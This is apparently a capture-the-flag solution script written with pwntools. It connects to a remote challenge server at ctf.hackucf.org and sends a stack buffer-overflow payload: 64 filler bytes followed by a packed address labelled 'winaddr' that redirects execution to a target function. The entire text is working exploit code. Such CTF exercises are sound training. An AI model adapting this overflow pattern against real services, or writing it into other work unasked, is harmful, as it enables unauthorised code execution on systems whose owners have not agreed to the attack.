from pwn import *

io = remote("ctf.hackucf.org", 9002)
winaddr = 0x8049256
payload = b'A' * 64 + p32(winaddr)

io.sendline(payload)

print(io.recvline())